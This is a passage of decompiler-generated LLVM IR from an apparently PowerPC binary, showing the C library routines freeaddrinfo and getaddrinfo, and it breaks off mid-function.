  uselistorder label %dec_label_pc_1001cb54, { 1, 0 }
  uselistorder label %dec_label_pc_1001cb0c, { 1, 0 }
  uselistorder label %dec_label_pc_1001caec, { 1, 0 }
  uselistorder label %dec_label_pc_1001ca80, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_1001c9f4, { 1, 0 }
  uselistorder label %dec_label_pc_1001c990, { 1, 0 }
  uselistorder label %dec_label_pc_1001c920, { 1, 0 }
  uselistorder label %dec_label_pc_1001c900, { 1, 0 }
  uselistorder label %dec_label_pc_1001c8e4, { 1, 0 }
}

define i32 @freeaddrinfo(i32 %arg1) local_unnamed_addr {
entry:
  %v3_1001d4343 = icmp eq i32 %arg1, 0
  store i32 %arg1, i32* @r3, align 4
  br i1 %v3_1001d4343, label %dec_label_pc_1001d440, label %dec_label_pc_1001d42c

dec_label_pc_1001d42c:                            ; preds = %entry, %dec_label_pc_1001d42c
  %v0_1001d42c = phi i32 [ %v0_1001d434.pr, %dec_label_pc_1001d42c ], [ %arg1, %entry ]
  %v1_1001d42c = add i32 %v0_1001d42c, 28
  %v2_1001d42c = inttoptr i32 %v1_1001d42c to i32*
  %v3_1001d42c = load i32, i32* %v2_1001d42c, align 4
  store i32 %v3_1001d42c, i32* @r29, align 4
  store i32 268555316, i32* @lr, align 4
  %v0_1001d430 = call i32 @free()
  %v0_1001d434.pr = load i32, i32* @r29, align 4
  %v3_1001d434 = icmp eq i32 %v0_1001d434.pr, 0
  store i32 %v0_1001d434.pr, i32* @r3, align 4
  br i1 %v3_1001d434, label %dec_label_pc_1001d440, label %dec_label_pc_1001d42c

dec_label_pc_1001d440:                            ; preds = %dec_label_pc_1001d42c, %entry
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_1001d434.pr, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1001d42c, { 1, 0 }
}

define i32 @getaddrinfo(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %cr7_eq.global-to-local = alloca i1, align 1
  %r21.global-to-local = alloca i32, align 4
  %r22.global-to-local = alloca i32, align 4
  %r23.global-to-local = alloca i32, align 4
  %r24.global-to-local = alloca i32, align 4
  %r25.global-to-local = alloca i32, align 4
  %r26.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %stack_var_-104 = alloca i32, align 4
  %stack_var_-100 = alloca i8*, align 4
  %stack_var_-88 = alloca i32, align 4
  store i32 %tmp, i32* @r27, align 4
  %v4_1001d460 = icmp eq i8* %arg1, null
  store i32 0, i32* %stack_var_-104, align 4
  store i32 %arg2, i32* @r31, align 4
  store i32 %arg3, i32* @r29, align 4
  store i32 %arg4, i32* %r21.global-to-local, align 4
  br i1 %v4_1001d460, label %dec_label_pc_1001d49c, label %dec_label_pc_1001d480

dec_label_pc_1001d480:                            ; preds = %entry
  %v2_1001d480 = load i8, i8* %arg1, align 1
  %v3_1001d484 = icmp eq i8 %v2_1001d480, 42
  store i1 %v3_1001d484, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1001d484, label %dec_label_pc_1001d48c, label %dec_label_pc_1001d49c

dec_label_pc_1001d48c:                            ; preds = %dec_label_pc_1001d480
  %v1_1001d48c = add i32 %tmp, 1
  %v2_1001d48c = inttoptr i32 %v1_1001d48c to i8*
  %v3_1001d48c = load i8, i8* %v2_1001d48c, align 1
  %v4_1001d48c = zext i8 %v3_1001d48c to i32
  %v1_1001d490 = sub nsw i32 0, %v4_1001d48c
  %tmp41 = icmp ne i8 %v3_1001d48c, 0
  %v1_1001d494 = zext i1 %tmp41 to i32
  %v2_1001d494 = ashr i32 %v1_1001d490, 31
  %v3_1001d494 = and i32 %v2_1001d494, -2
  %v4_1001d494 = or i32 %v3_1001d494, %v1_1001d494
  %v2_1001d498 = and i32 %v4_1001d494, %tmp
  store i32 %v2_1001d498, i32* @r27, align 4
  br label %dec_label_pc_1001d49c

dec_label_pc_1001d49c:                            ; preds = %dec_label_pc_1001d480, %dec_label_pc_1001d48c, %entry
  %v0_1001d4c0 = phi i32 [ %tmp, %entry ], [ %v2_1001d498, %dec_label_pc_1001d48c ], [ %tmp, %dec_label_pc_1001d480 ]
  %v3_1001d49c = icmp eq i32 %arg2, 0
  store i1 %v3_1001d49c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1001d49c, label %dec_label_pc_1001d4c0, label %dec_label_pc_1001d4a4

dec_label_pc_1001d4a4:                            ; preds = %dec_label_pc_1001d49c
  %v1_1001d4a4 = inttoptr i32 %arg2 to i8*
  %v2_1001d4a4 = load i8, i8* %v1_1001d4a4, align 1
  %v3_1001d4a8 = icmp eq i8 %v2_1001d4a4, 42
  store i1 %v3_1001d4a8, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1001d4a8, label %dec_label_pc_1001d4b0, label %dec_label_pc_1001d4c0

dec_label_pc_1001d4b0:                            ; preds = %dec_label_pc_1001d4a4
  %v1_1001d4b0 = add i32 %arg2, 1
  %v2_1001d4b0 = inttoptr i32 %v1_1001d4b0 to i8*
  %v3_1001d4b0 = load i8, i8* %v2_1001d4b0, align 1
  %v4_1001d4b0 = zext i8 %v3_1001d4b0 to i32
  %v1_1001d4b4 = sub nsw i32 0, %v4_1001d4b0
  %tmp42 = icmp ne i8 %v3_1001d4b0, 0
  %v1_1001d4b8 = zext i1 %tmp42 to i32
  %v2_1001d4b8 = ashr i32 %v1_1001d4b4, 31
  %v3_1001d4b8 = and i32 %v2_1001d4b8, -2
  %v4_1001d4b8 = or i32 %v3_1001d4b8, %v1_1001d4b8
  %v2_1001d4bc = and i32 %v4_1001d4b8, %arg2
  store i32 %v2_1001d4bc, i32* @r31, align 4
  br label %dec_label_pc_1001d4c0

dec_label_pc_1001d4c0:                            ; preds = %dec_label_pc_1001d4a4, %dec_label_pc_1001d49c, %dec_label_pc_1001d4b0
  %v1_1001d4c0 = phi i32 [ %arg2, %dec_label_pc_1001d4a4 ], [ 0, %dec_label_pc_1001d49c ], [ %v2_1001d4bc, %dec_label_pc_1001d4b0 ]
  %v2_1001d4c0 = or i32 %v1_1001d4c0, %v0_1001d4c0
  %v5_1001d4c0 = icmp eq i32 %v2_1001d4c0, 0
  br i1 %v5_1001d4c0, label %dec_label_pc_1001d728, label %dec_label_pc_1001d4c8

dec_label_pc_1001d4c8:                            ; preds = %dec_label_pc_1001d4c0
  %v3_1001d4c8 = icmp eq i32 %arg3, 0
  store i1 %v3_1001d4c8, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1001d4c8, label %dec_label_pc_1001d4d0, label %dec_label_pc_1001d4e4

dec_label_pc_1001d4d0:                            ; preds = %dec_label_pc_1001d4c8
  %v2_1001d4d0 = ptrtoint i32* %stack_var_-88 to i32
  store i32 %v2_1001d4d0, i32* @r29, align 4
  store i32 0, i32* @r4, align 4
  store i32 %v2_1001d4d0, i32* @r3, align 4
  store i32 32, i32* @r5, align 4
  store i32 268555492, i32* @lr, align 4
  %v0_1001d4e0 = call i32 @__GI_memset()
  store i32 %v0_1001d4e0, i32* %r3.global-to-local, align 4
  %v0_1001d4e4.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_1001d4e4

dec_label_pc_1001d4e4:                            ; preds = %dec_label_pc_1001d4c8, %dec_label_pc_1001d4d0
  %v0_1001d4e4 = phi i32 [ %arg3, %dec_label_pc_1001d4c8 ], [ %v0_1001d4e4.pre, %dec_label_pc_1001d4d0 ]
  %v1_1001d4e4 = inttoptr i32 %v0_1001d4e4 to i32*
  %v2_1001d4e4 = load i32, i32* %v1_1001d4e4, align 4
  %v2_1001d4ec = and i32 %v2_1001d4e4, -1088
  %v5_1001d4ec = icmp eq i32 %v2_1001d4ec, 0
  br i1 %v5_1001d4ec, label %dec_label_pc_1001d4f4, label %dec_label_pc_1001d730

dec_label_pc_1001d4f4:                            ; preds = %dec_label_pc_1001d4e4
  %v1_1001d4f4 = and i32 %v2_1001d4e4, 2
  %v3_1001d4f4 = icmp eq i32 %v1_1001d4f4, 0
  br i1 %v3_1001d4f4, label %dec_label_pc_1001d504, label %dec_label_pc_1001d4fc

dec_label_pc_1001d4fc:                            ; preds = %dec_label_pc_1001d4f4
  %v0_1001d4fc = load i32, i32* @r27, align 4
  %v3_1001d4fc = icmp eq i32 %v0_1001d4fc, 0
  store i1 %v3_1001d4fc, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1001d4fc, label %dec_label_pc_1001d730, label %dec_label_pc_1001d504

dec_label_pc_1001d504:                            ; preds = %dec_label_pc_1001d4fc, %dec_label_pc_1001d4f4
  %v0_1001d504 = load i32, i32* @r31, align 4
  %v3_1001d504 = icmp eq i32 %v0_1001d504, 0
  store i1 %v3_1001d504, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1001d504, label %dec_label_pc_1001d580, label %dec_label_pc_1001d50c

dec_label_pc_1001d50c:                            ; preds = %dec_label_pc_1001d504
  %v1_1001d50c = inttoptr i32 %v0_1001d504 to i8*
  %v2_1001d50c = load i8, i8* %v1_1001d50c, align 1
  %v3_1001d510 = icmp eq i8 %v2_1001d50c, 0
  store i1 %v3_1001d510, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1001d510, label %dec_label_pc_1001d580, label %dec_label_pc_1001d518

dec_label_pc_1001d518:                            ; preds = %dec_label_pc_1001d50c
  store i32 %v0_1001d504, i32* %r3.global-to-local, align 4
  %v2_1001d51c = ptrtoint i8** %stack_var_-100 to i32
  store i32 %v2_1001d51c, i32* @r4, align 4
  store i32 10, i32* @r5, align 4
  store i32 268555564, i32* @lr, align 4
  %v4_1001d528 = call i32 @strtoul(i32 %v0_1001d504, i32 %v2_1001d51c, i32 10)
  store i32 %v4_1001d528, i32* %r3.global-to-local, align 4
  %v3_1001d52c = load i8*, i8** %stack_var_-100, align 4
  %v2_1001d534 = load i8, i8* %v3_1001d52c, align 1
  %v3_1001d538 = icmp eq i8 %v2_1001d534, 0
  store i1 %v3_1001d538, i1* %cr7_eq.global-to-local, align 1
  %v0_1001d55c = load i32, i32* @r29, align 4
  br i1 %v3_1001d538, label %dec_label_pc_1001d55c, label %dec_label_pc_1001d540

dec_label_pc_1001d540:                            ; preds = %dec_label_pc_1001d518
  %v1_1001d540 = inttoptr i32 %v0_1001d55c to i32*
  %v2_1001d540 = load i32, i32* %v1_1001d540, align 4
  %v1_1001d544 = and i32 %v2_1001d540, 1024
  %v3_1001d544 = icmp eq i32 %v1_1001d544, 0
  br i1 %v3_1001d544, label %dec_label_pc_1001d54c, label %dec_label_pc_1001d728

dec_label_pc_1001d54c:                            ; preds = %dec_label_pc_1001d540
  br label %dec_label_pc_1001d584

dec_label_pc_1001d55c:                            ; preds = %dec_label_pc_1001d518
  %v1_1001d55c = add i32 %v0_1001d55c, 8
  %v2_1001d55c = inttoptr i32 %v1_1001d55c to i32*
  %v3_1001d55c = load i32, i32* %v2_1001d55c, align 4
  %v3_1001d560 = icmp eq i32 %v3_1001d55c, 0
  store i1 %v3_1001d560, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1001d560, label %dec_label_pc_1001d568, label %dec_label_pc_1001d578

dec_label_pc_1001d568:                            ; preds = %dec_label_pc_1001d55c
  %v1_1001d568 = add i32 %v0_1001d55c, 12
  %v2_1001d568 = inttoptr i32 %v1_1001d568 to i32*
  %v3_1001d568 = load i32, i32* %v2_1001d568, align 4
  store i32 -8, i32* %r3.global-to-local, align 4
  %v3_1001d570 = icmp eq i32 %v3_1001d568, 0
  store i1 %v3_1001d570, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1001d570, label %dec_label_pc_1001d734, label %dec_label_pc_1001d578

dec_label_pc_1001d578:                            ; preds = %dec_label_pc_1001d55c, %dec_label_pc_1001d568
  br label %dec_label_pc_1001d584

dec_label_pc_1001d580:                            ; preds = %dec_label_pc_1001d50c, %dec_label_pc_1001d504
  br label %dec_label_pc_1001d584

dec_label_pc_1001d584:                            ; preds = %dec_label_pc_1001d578, %dec_label_pc_1001d54c, %dec_label_pc_1001d580
  %v0_1001d5ac20 = phi i32 [ %v0_1001d55c, %dec_label_pc_1001d578 ], [ %v0_1001d55c, %dec_label_pc_1001d54c ], [ %v0_1001d4e4, %dec_label_pc_1001d580 ]
  %v0_1001d584 = load i32, i32* %r21.global-to-local, align 4
  %v3_1001d584 = icmp eq i32 %v0_1001d584, 0
  %v2_1001d590 = ptrtoint i32* %stack_var_-104 to i32
  %.v2_1001d590 = select i1 %v3_1001d584, i32 0, i32 %v2_1001d590
  store i32 %.v2_1001d590, i32* %r24.global-to-local, align 4
  store i32 0, i32* %r22.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1002f01c.1194 to i32), i32* %r28.global-to-local, align 4
  store i32 0, i32* %r23.global-to-local, align 4
  store i32 0, i32* %r26.global-to-local, align 4
  %v3_1001d6d412 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1002f01c.1194 to i32), i32 4) to i32*), align 4
  %v3_1001d6d815 = icmp eq i32 %v3_1001d6d412, 0
  store i1 %v3_1001d6d815, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1001d6d815, label %dec_label_pc_1001d6e0, label %dec_label_pc_1001d5ac

dec_label_pc_1001d5ac:                            ; preds = %dec_label_pc_1001d584, %dec_label_pc_1001d6d4.backedge.dec_label_pc_1001d5ac_crit_edge
  %v0_1001d5b0 = phi i32 [ %v0_1001d6d4, %dec_label_pc_1001d6d4.backedge.dec_label_pc_1001d5ac_crit_edge ], [ ptrtoint (i32* @global_var_1002f01c.1194 to i32), %dec_label_pc_1001d584 ]
  %v0_1001d5c4 = phi i32 [ %v0_1001d5ac.pre, %dec_label_pc_1001d6d4.backedge.dec_label_pc_1001d5ac_crit_edge ], [ %v0_1001d5ac20, %dec_label_pc_1001d584 ]
  %v1_1001d5ac = add i32 %v0_1001d5c4, 4
  %v2_1001d5ac = inttoptr i32 %v1_1001d5ac to i32*
  %v3_1001d5ac = load i32, i32* %v2_1001d5ac, align 4
  %v1_1001d5b0 = inttoptr i32 %v0_1001d5b0 to i32*
  %v2_1001d5b0 = load i32, i32* %v1_1001d5b0, align 4
  store i32 %v2_1001d5b0, i32* %r3.global-to-local, align 4
  %v4_1001d5b4 = icmp eq i32 %v3_1001d5ac, %v2_1001d5b0
  store i1 %v4_1001d5b4, i1* %cr7_eq.global-to-local, align 1
  br i1 %v4_1001d5b4, label %dec_label_pc_1001d5c4, label %dec_label_pc_1001d5bc

dec_label_pc_1001d5bc:                            ; preds = %dec_label_pc_1001d5ac
  %v3_1001d5bc = icmp eq i32 %v3_1001d5ac, 0
  store i1 %v3_1001d5bc, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1001d5bc, label %dec_label_pc_1001d5c4, label %dec_label_pc_1001d6d0

dec_label_pc_1001d5c4:                            ; preds = %dec_label_pc_1001d5bc, %dec_label_pc_1001d5ac
  %v1_1001d5c4 = inttoptr i32 %v0_1001d5c4 to i32*
  %v2_1001d5c4 = load i32, i32* %v1_1001d5c4, align 4
  %v1_1001d5c8 = and i32 %v2_1001d5c4, 32
  %v3_1001d5c8 = icmp eq i32 %v1_1001d5c8, 0
  br i1 %v3_1001d5c8, label %dec_label_pc_1001d634, label %dec_label_pc_1001d5d0

dec_label_pc_1001d5d0:                            ; preds = %dec_label_pc_1001d5c4
  %v1_1001d5d0 = urem i32 %v2_1001d5b0, 65536
  store i32 %v1_1001d5d0, i32* @r31, align 4
  %v0_1001d5d4 = call i32 @__errno_location()
  store i32 %v0_1001d5d4, i32* %r3.global-to-local, align 4
  %v0_1001d5d8 = load i32, i32* @r31, align 4
  %v3_1001d5d8 = icmp eq i32 %v0_1001d5d8, 2
  store i1 %v3_1001d5d8, i1* %cr7_eq.global-to-local, align 1
  store i32 %v0_1001d5d4, i32* %r30.global-to-local, align 4
  %v1_1001d5e0 = inttoptr i32 %v0_1001d5d4 to i32*
  %v2_1001d5e0 = load i32, i32* %v1_1001d5e0, align 4
  store i32 %v2_1001d5e0, i32* %r25.global-to-local, align 4
  br i1 %v3_1001d5d8, label %dec_label_pc_1001d624, label %dec_label_pc_1001d5e8

dec_label_pc_1001d5e8:                            ; preds = %dec_label_pc_1001d5d0
  %v3_1001d5e8 = icmp eq i32 %v0_1001d5d8, 10
  store i1 %v3_1001d5e8, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1001d5e8, label %dec_label_pc_1001d628, label %dec_label_pc_1001d5f4

dec_label_pc_1001d5f4:                            ; preds = %dec_label_pc_1001d5e8
  store i32 %v0_1001d5d8, i32* %r3.global-to-local, align 4
  store i32 268555780, i32* @lr, align 4
  %v3_1001d600 = call i32 @socket(i32 %v0_1001d5d8, i32 2, i32 0)
  store i32 %v3_1001d600, i32* %r3.global-to-local, align 4
  %v3_1001d604 = icmp eq i32 %v3_1001d600, 0
  store i1 %v3_1001d604, i1* %cr7_eq.global-to-local, align 1
  %tmp40 = icmp sgt i32 %v3_1001d600, -1
  br i1 %tmp40, label %dec_label_pc_1001d620, label %dec_label_pc_1001d60c

dec_label_pc_1001d60c:                            ; preds = %dec_label_pc_1001d5f4
  %v0_1001d60c = load i32, i32* %r30.global-to-local, align 4
  %v1_1001d60c = inttoptr i32 %v0_1001d60c to i32*
  %v2_1001d60c = load i32, i32* %v1_1001d60c, align 4
  %v3_1001d614 = icmp eq i32 %v2_1001d60c, 24
  store i1 %v3_1001d614, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1001d614, label %dec_label_pc_1001d624, label %dec_label_pc_1001d628

dec_label_pc_1001d620:                            ; preds = %dec_label_pc_1001d5f4
  store i32 ptrtoint ([3 x i8]* @global_var_1001d624.1195 to i32), i32* @lr, align 4
  %v1_1001d620 = call i32 @__libc_close(i32 %v3_1001d600)
  store i32 %v1_1001d620, i32* %r3.global-to-local, align 4
  %v1_1001d62c.pre.pre = load i32, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1001d624

dec_label_pc_1001d624:                            ; preds = %dec_label_pc_1001d60c, %dec_label_pc_1001d5d0, %dec_label_pc_1001d620
  %v1_1001d62c.pre = phi i32 [ %v0_1001d60c, %dec_label_pc_1001d60c ], [ %v0_1001d5d4, %dec_label_pc_1001d5d0 ], [ %v1_1001d62c.pre.pre, %dec_label_pc_1001d620 ]
  br label %dec_label_pc_1001d628

dec_label_pc_1001d628:                            ; preds = %dec_label_pc_1001d60c, %dec_label_pc_1001d5e8, %dec_label_pc_1001d624
  %v1_1001d62c = phi i32 [ %v0_1001d5d4, %dec_label_pc_1001d5e8 ], [ %v1_1001d62c.pre, %dec_label_pc_1001d624 ], [ %v0_1001d60c, %dec_label_pc_1001d60c ]
  %v0_1001d628 = phi i1 [ false, %dec_label_pc_1001d5e8 ], [ false, %dec_label_pc_1001d624 ], [ true, %dec_label_pc_1001d60c ]
  store i1 %v0_1001d628, i1* %cr7_eq.global-to-local, align 1
  %v0_1001d62c = load i32, i32* %r25.global-to-local, align 4
  %v2_1001d62c = inttoptr i32 %v1_1001d62c to i32*
  store i32 %v0_1001d62c, i32* %v2_1001d62c, align 4
  br i1 %v0_1001d628, label %dec_label_pc_1001d628.dec_label_pc_1001d6d0_crit_edge, label %dec_label_pc_1001d634

dec_label_pc_1001d628.dec_label_pc_1001d6d0_crit_edge: ; preds = %dec_label_pc_1001d628
  %v0_1001d6d0.pre = load i32, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_1001d6d0

dec_label_pc_1001d634:                            ; preds = %dec_label_pc_1001d628, %dec_label_pc_1001d5c4
  %v0_1001d634 = load i32, i32* %r26.global-to-local, align 4
  %v3_1001d634 = icmp eq i32 %v0_1001d634, 0
  store i1 %v3_1001d634, i1* %cr7_eq.global-to-local, align 1
  %v0_1001d638 = load i32, i32* %r22.global-to-local, align 4
  %v1_1001d638 = add i32 %v0_1001d638, 1
  store i32 %v1_1001d638, i32* %r22.global-to-local, align 4
  br i1 %v3_1001d634, label %dec_label_pc_1001d634.dec_label_pc_1001d650_crit_edge, label %dec_label_pc_1001d640

dec_label_pc_1001d634.dec_label_pc_1001d650_crit_edge: ; preds = %dec_label_pc_1001d634
  %v0_1001d650.pre = load i32, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_1001d650

dec_label_pc_1001d640:                            ; preds = %dec_label_pc_1001d634
  %v1_1001d640 = add i32 %v0_1001d634, 4
  %v2_1001d640 = inttoptr i32 %v1_1001d640 to i32*
  %v3_1001d640 = load i32, i32* %v2_1001d640, align 4
  %v0_1001d644 = load i32, i32* %r28.global-to-local, align 4
  %v1_1001d644 = add i32 %v0_1001d644, 4
  %v2_1001d644 = inttoptr i32 %v1_1001d644 to i32*
  %v3_1001d644 = load i32, i32* %v2_1001d644, align 4
  %v4_1001d648 = icmp eq i32 %v3_1001d640, %v3_1001d644
  store i1 %v4_1001d648, i1* %cr7_eq.global-to-local, align 1
  br i1 %v4_1001d648, label %dec_label_pc_1001d6d0, label %dec_label_pc_1001d650

dec_label_pc_1001d650:                            ; preds = %dec_label_pc_1001d634.dec_label_pc_1001d650_crit_edge, %dec_label_pc_1001d640
  %v0_1001d650 = phi i32 [ %v0_1001d650.pre, %dec_label_pc_1001d634.dec_label_pc_1001d650_crit_edge ], [ %v0_1001d644, %dec_label_pc_1001d640 ]
  %v1_1001d650 = add i32 %v0_1001d650, 4
  %v2_1001d650 = inttoptr i32 %v1_1001d650 to i32*
  %v3_1001d650 = load i32, i32* %v2_1001d650, align 4
  %v0_1001d654 = load i32, i32* @r27, align 4
  store i32 %v0_1001d654, i32* %r3.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_1001d650)
  %v0_1001d66c = load i32, i32* %r3.global-to-local, align 4
  %v4_1001d66c = icmp eq i32 %v0_1001d66c, 0
  br i1 %v4_1001d66c, label %dec_label_pc_1001d6b0, label %dec_label_pc_1001d674

dec_label_pc_1001d674:                            ; preds = %dec_label_pc_1001d650
  %v0_1001d674 = load i32, i32* @r29, align 4
  %v1_1001d674 = add i32 %v0_1001d674, 4
  %v2_1001d674 = inttoptr i32 %v1_1001d674 to i32*
  %v3_1001d674 = load i32, i32* %v2_1001d674, align 4
  %v3_1001d678 = icmp eq i32 %v3_1001d674, 0
  store i1 %v3_1001d678, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1001d678, label %dec_label_pc_1001d680, label %dec_label_pc_1001d694

dec_label_pc_1001d680:                            ; preds = %dec_label_pc_1001d674
  %v2_1001d680 = and i32 %v0_1001d66c, 256
  %v4_1001d680 = icmp eq i32 %v2_1001d680, 0
  br i1 %v4_1001d680, label %dec_label_pc_1001d694, label %dec_label_pc_1001d688

dec_label_pc_1001d688:                            ; preds = %dec_label_pc_1001d680
  store i32 %v0_1001d66c, i32* %r23.global-to-local, align 4
  %v0_1001d68c = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_1001d68c, i32* %r26.global-to-local, align 4
  br label %dec_label_pc_1001d6d4.backedge

dec_label_pc_1001d694:                            ; preds = %dec_label_pc_1001d674, %dec_label_pc_1001d680
  %v3_1001d694 = load i32, i32* %stack_var_-104, align 4
  store i32 %v3_1001d694, i32* %r3.global-to-local, align 4
  %v3_1001d698 = icmp eq i32 %v3_1001d694, 0
  store i1 %v3_1001d698, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1001d698, label %dec_label_pc_1001d6a4, label %dec_label_pc_1001d6a0

dec_label_pc_1001d6a0:                            ; preds = %dec_label_pc_1001d694
  store i32 268555940, i32* @lr, align 4
  %v1_1001d6a0 = call i32 @freeaddrinfo(i32 %v3_1001d694)
  store i32 %v1_1001d6a0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1001d6a4

dec_label_pc_1001d6a4:                            ; preds = %dec_label_pc_1001d694, %dec_label_pc_1001d6a0
  %v2_1001d6a4 = call i32 @__asm_rlwinm(i32 %v0_1001d66c, i32 0, i32 24, i32 22)
  %v1_1001d6a8 = sub i32 0, %v2_1001d6a4
  store i32 %v1_1001d6a8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1001d734

dec_label_pc_1001d6b0:                            ; preds = %dec_label_pc_1001d650
  %v0_1001d6b0 = load i32, i32* %r24.global-to-local, align 4
  %v3_1001d6b0 = icmp eq i32 %v0_1001d6b0, 0
  store i1 %v3_1001d6b0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1001d6b0, label %dec_label_pc_1001d6cc, label %dec_label_pc_1001d6c0.preheader

dec_label_pc_1001d6c0.preheader:                  ; preds = %dec_label_pc_1001d6b0
  %v1_1001d6c04 = inttoptr i32 %v0_1001d6b0 to i32*
  %v2_1001d6c05 = load i32, i32* %v1_1001d6c04, align 4
  %v3_1001d6c48 = icmp eq i32 %v2_1001d6c05, 0
  store i1 %v3_1001d6c48, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1001d6c48, label %dec_label_pc_1001d6cc, label %dec_label_pc_1001d6bc

dec_label_pc_1001d6bc:                            ; preds = %dec_label_pc_1001d6c0.preheader, %dec_label_pc_1001d6bc
  %v0_1001d6bc = phi i32 [ %v2_1001d6c0, %dec_label_pc_1001d6bc ], [ %v2_1001d6c05, %dec_label_pc_1001d6c0.preheader ]
  %v1_1001d6bc = add i32 %v0_1001d6bc, 28
  store i32 %v1_1001d6bc, i32* %r24.global-to-local, align 4
  %v1_1001d6c0 = inttoptr i32 %v1_1001d6bc to i32*
  %v2_1001d6c0 = load i32, i32* %v1_1001d6c0, align 4
  %v3_1001d6c4 = icmp eq i32 %v2_1001d6c0, 0
  br i1 %v3_1001d6c4, label %dec_label_pc_1001d6c0.dec_label_pc_1001d6cc.loopexit_crit_edge, label %dec_label_pc_1001d6bc

dec_label_pc_1001d6c0.dec_label_pc_1001d6cc.loopexit_crit_edge: ; preds = %dec_label_pc_1001d6bc
  store i1 true, i1* %cr7_eq.global-to-local, align 1
  br label %dec_label_pc_1001d6cc

dec_label_pc_1001d6cc:                            ; preds = %dec_label_pc_1001d6c0.preheader, %dec_label_pc_1001d6c0.dec_label_pc_1001d6cc.loopexit_crit_edge, %dec_label_pc_1001d6b0
  %v0_1001d6cc = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_1001d6cc, i32* %r26.global-to-local, align 4
  br label %dec_label_pc_1001d6d0

dec_label_pc_1001d6d0:                            ; preds = %dec_label_pc_1001d628.dec_label_pc_1001d6d0_crit_edge, %dec_label_pc_1001d5bc, %dec_label_pc_1001d640, %dec_label_pc_1001d6cc
  %v0_1001d6d0 = phi i32 [ %v0_1001d6d0.pre, %dec_label_pc_1001d628.dec_label_pc_1001d6d0_crit_edge ], [ %v0_1001d5b0, %dec_label_pc_1001d5bc ], [ %v0_1001d644, %dec_label_pc_1001d640 ], [ %v0_1001d6cc, %dec_label_pc_1001d6cc ]
  %v1_1001d6d0 = add i32 %v0_1001d6d0, 8
  store i32 %v1_1001d6d0, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_1001d6d4.backedge

dec_label_pc_1001d6d4.backedge:                   ; preds = %dec_label_pc_1001d6d0, %dec_label_pc_1001d688
  %v0_1001d6d4 = phi i32 [ %v1_1001d6d0, %dec_label_pc_1001d6d0 ], [ %v0_1001d68c, %dec_label_pc_1001d688 ]
  %v1_1001d6d4 = add i32 %v0_1001d6d4, 4
  %v2_1001d6d4 = inttoptr i32 %v1_1001d6d4 to i32*
  %v3_1001d6d4 = load i32, i32* %v2_1001d6d4, align 4
  %v3_1001d6d8 = icmp eq i32 %v3_1001d6d4, 0
  store i1 %v3_1001d6d8, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1001d6d8, label %dec_label_pc_1001d6d4.dec_label_pc_1001d6e0_crit_edge, label %dec_label_pc_1001d6d4.backedge.dec_label_pc_1001d5ac_crit_edge

dec_label_pc_1001d6d4.backedge.dec_label_pc_1001d5ac_crit_edge: ; preds = %dec_label_pc_1001d6d4.backedge
  %v0_1001d5ac.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_1001d5ac

dec_label_pc_1001d6d4.dec_label_pc_1001d6e0_crit_edge: ; preds = %dec_label_pc_1001d6d4.backedge
  %v0_1001d6e0.pre = load i32, i32* %r22.global-to-local, align 4
  %phitmp = icmp eq i32 %v0_1001d6e0.pre, 0
  br label %dec_label_pc_1001d6e0

dec_label_pc_1001d6e0:                            ; preds = %dec_label_pc_1001d6d4.dec_label_pc_1001d6e0_crit_edge, %dec_label_pc_1001d584
  %v0_1001d6e0 = phi i1 [ %phitmp, %dec_label_pc_1001d6d4.dec_label_pc_1001d6e0_crit_edge ], [ true, %dec_label_pc_1001d584 ]
  store i1 %v0_1001d6e0, i1* %cr7_eq.global-to-local, align 1
  store i32 -6, i32* %r3.global-to-local, align 4
  br i1 %v0_1001d6e0, label %dec_label_pc_1001d734, label %dec_label_pc_1001d6ec

dec_label_pc_1001d6ec:                            ; preds = %dec_label_pc_1001d6e0
  %v3_1001d6ec = load i32, i32* %stack_var_-104, align 4
  %v3_1001d6f0 = icmp eq i32 %v3_1001d6ec, 0
  store i1 %v3_1001d6f0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1001d6f0, label %dec_label_pc_1001d704, label %dec_label_pc_1001d6f8

dec_label_pc_1001d6f8:                            ; preds = %dec_label_pc_1001d6ec
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_1001d6fc = load i32, i32* %r21.global-to-local, align 4
  %v2_1001d6fc = inttoptr i32 %v1_1001d6fc to i32*
  store i32 %v3_1001d6ec, i32* %v2_1001d6fc, align 4
